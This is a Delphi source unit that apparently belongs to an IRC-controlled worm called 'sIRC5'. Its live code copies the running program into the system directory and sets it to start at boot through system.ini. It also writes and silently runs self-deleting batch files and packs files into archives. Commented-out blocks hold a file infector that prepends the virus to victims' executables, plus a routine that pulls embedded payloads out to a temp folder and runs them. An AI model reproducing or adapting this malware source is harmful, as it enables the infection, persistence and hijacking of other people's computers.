   unit sFunc;

   interface

   Uses
     Windows, Messages, Winsock, IconChanger;

     const
       faReadOnly                          = $00000001;
       faHidden                            = $00000002;
       faSysFile                           = $00000004;
       faVolumeID                          = $00000008;
       faDirectory                         = $00000010;
       faArchive                           = $00000020;
       faAnyFile                           = $0000003F;
       fmOpenRead                          = $0000;
       fmOpenWrite                         = $0001;
       fmOpenReadWrite                     = $0002;
       fmShareCompat                       = $0000;
       fmShareExclusive                    = $0010;
       fmShareDenyWrite                    = $0020;
       fmShareDenyRead                     = $0030;
       fmShareDenyNone                     = $0040;

     type
       TFileName = type string;
       TSearchRec = record
         Time: Integer;
         Size: Integer;
         Attr: Integer;
         Name: TFileName;
         ExcludeAttr: Integer;
         FindHandle: THandle;
         FindData: TWin32FindData;
       end;

       TAttachmentHeader = record
         MagicNumber: cardinal;
         CRC: cardinal;
         Size: int64;
         IsStub: boolean;
         FileName: array[0..MAX_PATH] of char;
       end;
       PAttachmentHeader = ^TAttachmentHeader;

       LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
       end;


   function DirectoryExists(const Directory: string): Boolean;
   function ExtractFileName(St:String):String;
   function fSize(FileName: String): int64;
   function UpperCase(const S: string): string;
   function LowerCase(const S: string): string;
   function IntToStr(X: integer): string;
   function StrToInt(S: string): integer;
   function Trim(const S: string): string;
   function FileExists(const FileName: string): Boolean;
   function IPstr(HostName:String) : String;
   //function GetLocalIP: string;

   function iGetNick(Param:String):String;
   //function iGetHost(Param:String):String;
   //function iGetIdent(Param:String):String;
   function iGetMessage(Param:String):String;
   //function iGetChannel(Param:String):String;
   //function iGetFullHost(Param:String):String;
   function FindMatchingFile(var F: TSearchRec): Integer;
   function FindNext(var F: TSearchRec): Integer;
   function FindFirst(const Path: string; Attr: Integer;
                      var  F: TSearchRec): Integer;
   function SysDir:String;
   function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   function ZipIt(fName: String): Boolean;
   function FileExt(Name: String): String;
   {
   function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
   function AllocMem(Size: Cardinal): Pointer;
   function StrPas(const Str: PChar): string;
   function GetHeader(FileW: String): pAttachmentHeader;
   function FFileSize(FileName: String): int64;
   }
   procedure SendText(Text:String; Sock:TSocket);
   procedure FindClose(var F: TSearchRec);
   procedure ListFiles(D, Name, SearchName : String);
   procedure WriteBat(bName, bText : String; Run:Boolean);
   procedure Installsirc(name: String);
   {
   procedure Release;
   procedure infectFile(Victime:String);
   }

   //var
     {
     Virus  : tHandle;
     OutPut : tHandle;
     Header : tAttachmentHeader;
     itemHeader : pAttachmentHeader;

     fName  : String;
     StubSize : int64;
     }
   implementation

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   {
   function SpawnProgram(Filename: string): boolean;
    function ErrorString(ErrorCode: integer): string;
    var
      buffer: array[0..1024] of char;
    begin
      FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nil, ErrorCode, 0, @buffer, sizeof(buffer)-1, nil);
      result:= string(@buffer);
    end;

   var
     si: TStartupInfo;
     pi: TProcessInformation;
   begin
     FillChar(si, sizeof(si), 0);
     si.cb:= sizeof(si);
     si.dwFlags:= STARTF_USESHOWWINDOW;
     si.wShowWindow:= SW_SHOWDEFAULT;
     if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
     begin
       result:= false;
       Exit;
       Halt(0);
     end
     else
       result:= true;
   end;
   }

   { TEMP PATH !? what we all ever wanted }

   {
   function GetTmpPath: string;
   var
   buffer: array[0..MAX_PATH] of char;
   begin
     result:= '';
     if GetTempPathA(MAX_PATH, buffer) <> 0 then
     begin
       result:= String(PChar(@buffer));
       if result[length(result)] <> '\' then
       result:= result + '\';
     end;
   end;

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
     GENERIC_READ,
     GENERIC_WRITE,
     GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
     0,
     0,
     FILE_SHARE_READ,
     FILE_SHARE_WRITE,
     FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
     ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
     FILE_ATTRIBUTE_NORMAL, 0));
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
     0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   Procedure Release;
   var
     buffer: array[0..$ffff] of byte;
     fSource, fTemp: THandle;
     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;
     tmppath, fname, tname: string;
     Header: TAttachmentHeader;
   begin
     TmpPath := GetTmpPath;
     Try
       FSource := FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);
       If FSource = THandle(-1) Then
       Begin
         Exit;
       End;
       Try
         SetFilePointer(FSource, GetFileSize(FSource, NIL) - SizeOf(TAttachmentHeader), NIL, FILE_BEGIN);
         ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> SizeOf(Header)) Then
         Begin
           FileClose(FSource);
           Exit;
         End;
         SetFilePointer(FSource, Header.Size, NIL, FILE_BEGIN);
         While (SetFilePointer(FSource, 0, NIL, FILE_CURRENT) <= (GetFileSize(FSource, NIL) - SizeOf(Header))) Do
         Begin
           ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
           If Header.MagicNumber <> $FEEDBEEF Then
           Begin
             Exit;
           End;
           FName := Header.FileName;
           Repeat
             Str(GetTickCount, TName);
             Fname := 'tmp'+tname+'.exe';
             Sleep(0);
           Until Not FileExists(TmpPath+Fname);
           fTemp := FileCreate(TmpPath + Fname);
           NeededSize := Header.Size;
           Repeat
             If NeededSize > SizeOf(Buffer) Then
               BufferRead := SizeOf(Buffer)
             Else
               BufferRead := NeededSize;
             ReadFile(FSource, Buffer, BufferRead, BytesRead, NIL);
             WriteFile(FTemp, Buffer, BytesRead, BytesWritten, NIL);
             Dec(NeededSize, BytesRead);
           Until (BytesRead <> BufferRead) Or (NeededSize = 0);
           FileClose(FTemp);
           If (NeededSize <> 0) Or (Not SpawnProgram(TmpPath + Fname)) Then
           Begin
             FileClose(FSource);
             Exit;
           End;
         End;
         FileClose(FSource);
         Finally
           End;
       Finally
         End;
   End;


   Function FFileSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   Function GetHeader(FileW: String): pAttachmentHeader;
   Var
     Header: pAttachmentHeader;
   Begin
     Header := AllocMem(SizeOf(tAttachmentHeader));
     StrLCopy(@Header.Filename, pChar(FileW), MAX_PATH);
     Header.Size := FFileSize(FileW);
     Header.IsStub := False;
     Result := Header;
   End;

   function AllocMem(Size: Cardinal): Pointer;
   begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   end;

   function StrPas(const Str: PChar): string;
   begin
     Result := Str;
   end;

   function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
   asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   end;
   }
   (*
   Procedure infectFile(Victime:String);
   Var
     Buffer: Array[0..2048] Of Char;
     BytesRead, BytesWritten: LongWord;
     F:File;
     Str:String;
     I:Integer;
   Begin
     {$i-}
      AssignFile(F, Victime);
      FileMode:=0;
      Reset(F, 1);
      I := FileSize(F);
      SetLength(Str,FileSize(F));
      BlockRead(F, Str[1], I);
      CloseFile(F);
     {$i+}
     If Pos('BagarBubbaAndMarijuanaLovesYou',Str)>0 Then Exit;
     ZeroMemory(@Buffer, SizeOf(Buffer));
     OutPut := CreateFile(pChar(Victime+'-'),
               GENERIC_WRITE,
               FILE_SHARE_WRITE,
               NIL,
               CREATE_NEW,
               FILE_ATTRIBUTE_NORMAL,
               0);
     itemHeader := GetHeader(ParamStr(0));
     fName      := StrPas(@itemHeader.FileName);
     Virus  := CreateFile(pChar(fName),
               GENERIC_READ,
               FILE_SHARE_READ,
               NIL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
     Repeat
       ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
       WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
     Until BytesWritten = 0;
     CloseHandle(Virus);
     itemHeader := GetHeader(Victime);
     fName      := StrPas(@itemHeader.FileName);
     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     Header.Size := FFileSize(Victime);
     Header.IsStub := False;
     Header.FileName := itemHeader.FileName;
     WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
     Virus  := CreateFile(pChar(fName),
               GENERIC_READ,
               FILE_SHARE_READ,
               NIL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
     Repeat
       ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
       WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
     Until BytesWritten = 0;
     CloseHandle(Virus);

     itemHeader := GetHeader(ParamStr(0));
     fName := StrPas(@itemHeader.FileName);
     StubSize := FFileSize(ParamStr(0));

     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     Header.Size := StubSize;
     Header.IsStub := True;

     FillChar(Header.FileName, MAX_PATH+1, 0);

     WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
     Str := 'BagarBubbaAndMarijuanaLovesYou';
     WriteFile(OutPut, Str[1], Length(Str), BytesWritten, NIL);
     CloseHandle(OutPut);

     DeleteFile(pChar(Victime));
     CopyFile  (pChar(Victime+'-'), pChar(Victime), False);
     DeleteFile(pChar(Victime+'-'));
   End;
   *)
   function FileExt(Name: String): String;
   Begin
     If Pos('.', Name) = 0 Then Exit;

     While Pos('.', Name) > 0 Do
       Name := Copy(Name, Pos('.', Name)+1, Length(Name));

     Result := Name;
   End;

   Procedure Installsirc(name: String);
   Var
     FileName: String;
   Begin
     FileName := Sysdir + Name;
     If CopyFile(pChar(paramStr(0)), pChar(FileName), False) Then
     Begin
       WritePrivateProfileString('boot','shell',pChar('Explorer.exe '+name), 'system.ini');
       If CreateMutex(NIL, False, 'sIRC5') = error_already_exists Then
         ExitProcess(0);
     End Else
     Begin
       If CreateMutex(NIL, False, 'sIRC5') = error_already_exists Then
         ExitProcess(0);
     End;
   End;

   Procedure WriteBat(bName, bText : String; Run:Boolean);
   Var
     f : TextFile;
   Begin
     AssignFile(f, bName);
     ReWrite(f);
     Writeln(f, bText);
     writeln(f, 'del '+bname);
     CloseFile(f);
     If Run Then
       WinExec(pChar(bName), 0);
   End;

   Function ZipIt(fName: String): Boolean;
   Var
     zipPath: String;
     rarPath: String;
     rarString: String;
     zipString: String;
     rnd    : Integer;
     zipExist : Boolean;
     rarExist : Boolean;
   Begin
     Result := False;

     zipString := '" -a -r "'+Copy(fName, 1, length(fname)-4)+'" "'+fname+'"';
     rarString := '" a -idp -inul -c- -m5 "'+Copy(fName, 1, length(fname)-4)+'" "'+fname+'"';

     zipExist := False;
     rarExist := False;

     If GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\winzip32.exe', '') <> '' Then
     Begin
       zipExist := True;
       zipPath := GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\winzip32.exe', '');
     End;

     If GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\WinRAR.exe', '') <> '' Then
     Begin
       rarExist := True;
       rarPath := GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\WinRAR.exe', '');
     End;

     If (rarExist) and (zipExist) Then
     Begin
       zipString := '"' + zipPath + zipString;
       rarString := '"' + rarPath + rarString;

       Randomize;
       Rnd := Random(100);

       If Rnd > 50 Then
       Begin
         WriteBat('C:\rar.bat', rarString, true);
       End Else
       Begin
         WriteBat('C:\zip.bat', zipString, true);
       End;

     End Else
     If (rarExist) and (Not ZipExist) Then
     Begin
       rarString := '"' + rarPath + rarString;
       WriteBat('C:\rar.bat', rarString, true);
     End Else
     If (Not rarExist) and (zipExist) Then
     Begin
       zipString := '"' + zipPath + zipString;
       WriteBat('C:\zip.bat', zipString, true);
     End Else
       Result := False;

   End;

   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   Var
    Key : Hkey;
    Siz : Cardinal;
    Val : Array[0..16382] Of Char;
   Begin
    ZeroMemory(@Val, Length(Val));
    RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
    Siz := 16383;
    RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(Key);
    If Val<> '' then
     Result := Val;
   End;

   function SysDir:String;
   Var
     Dir: Array [0..256] Of Char;
   Begin
     GetSystemDirectory(Dir, 256);
     Result := String(Dir) + '\';
   End;



   procedure ListFiles(D, Name, SearchName: String);
   var
     Sr: TSearchRec;
   begin
     Try
       {
       // We need to sleep, else it crashes without any message (total strange o_O (?))
       Sleep(100);
       Maybe we dont need sleep afterall. :D
       }

       If D[Length(D)] <> '\' Then
         D := D + '\';

       If FindFirst(D + '*.*', faDirectory, Sr) = 0 Then
         Repeat
           // if dir.
             If ((Sr.Attr and faDirectory) = faDirectory) and (Sr.Name[1] <> '.') then
                 ListFiles(D + Sr.Name + '\', Name, SearchName)
             Else
           // else if file.
             Begin
               If (Sr.Name[1] <> '.') {or (Count < 45)} Then
               Begin
   ;
               End;
             End;
           // end
         Until (FindNext(Sr) <> 0);
       FindClose(Sr);
     Except
       ;
     End;
   End;

   // FindMatchingFile Function
   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   // FindClose Function
   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   // FindFirst Function
   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   // FindNext Function
   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   // Get irc nickname
   Function iGetNick(Param:String):String;
   Begin
    Result := Copy(Param, 2, Pos('!', Param)-2);
   End;
   {
   // Get irc ident
   Function iGetIdent(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos('@', Param)-2);
   End;

   // Get irc host
   Function iGetHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('@', Param)+1, Pos(' ', Param)-2);
   End;

   // Get irc full host
   Function iGetFullHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos(' ', Param)-2);
   End;

   // Get irc channel
   Function iGetChannel(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, 1, Pos(':', result)-2);
   End;
   }
   // Get irc message
   Function iGetMessage(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, Pos(':', result)+1, Length(Result));
    If Copy(Result, Length(Result)-1, 2) = #13#10 Then
      Result := Copy(Result, 1, Length(Result)-2);
   End;
   {
   // get local ip (not lanip)
   function GetLocalIP: string;
   var
     wsaData: TWSAData;
     addr: TSockAddrIn;
     Phe: PHostEnt;
     szHostName: array[0..128] of Char;
   begin
     Result := '';
     if WSAStartup($101, WSAData) <> 0 then
       Exit;
     try
       if GetHostName(szHostName, 128) <> SOCKET_ERROR then
       begin
         Phe := GetHostByName(szHostName);
         if Assigned(Phe) then
         begin
           addr.sin_addr.S_addr := longint(plongint(Phe^.h_addr_list^)^);
           Result := inet_ntoa(addr.sin_addr);
         end;
       end;
     finally
       WSACleanup;
     end;
   end;
   }
   // resolves ip from given hostname
   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   // makes given string to lowercase
   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   // makes string to integer
   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   // Trims a given string
   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   // Makes integers to strings.
   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   // Sends data using choosen socket.
   Procedure SendText(Text:String; Sock:TSocket);
   Begin
     Send(Sock, Text[1], Length(Text), 0);
   End;

   // Check if Directory Exists, If nOt then return False
   function DirectoryExists(const Directory: string): Boolean;
   var
     Code: Integer;
   begin
     Code := GetFileAttributes(PChar(Directory));
     Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
   end;

   // Extract filenames from given string.
   Function ExtractFileName(St:String):String;
   Var
     Str:String;
   Begin
     Str := St;
     Repeat
       If Pos('\', Str) > 0 Then
       Begin
         Str := Copy(Str, Pos('\', Str)+1, Length(Str));
       End;
     Until Pos('\', Str) = 0;
     Result := Str;
   End;

   // Give filesize
   Function fSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   // Makes given string to Uppercase
   function UpperCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;

   end.
